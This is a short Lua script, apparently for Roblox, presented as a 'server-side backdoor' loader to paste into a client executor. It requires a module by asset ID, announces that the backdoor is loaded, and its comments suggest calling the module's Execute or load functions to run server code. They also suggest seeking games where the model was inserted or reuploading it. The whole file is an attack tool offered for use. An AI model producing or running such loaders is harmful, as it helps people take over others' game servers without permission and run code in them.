-- Bruhpls SS Simple Loader (using the best public-ish ID)
-- Paste this in ANY client executor

local MODEL_ID = 16434836259  -- NetworkConnectionReplicator (Vision-Web style)

local success, mod = pcall(require, MODEL_ID)
if success then
    print("Bruhpls SS Backdoor loaded! Model: " .. MODEL_ID)
    -- Example usage (adjust based on the model's functions)
    -- mod.Execute("print('Server says hi from Bruhpls')")  -- if it has .Execute
    -- or mod.load('your_secret_key', 5)  -- from Vision-Web example
else
    warn("Backdoor not found or patched! Error: " .. tostring(mod))
    -- Try in a game where someone inserted this model or reupload it yourself
end
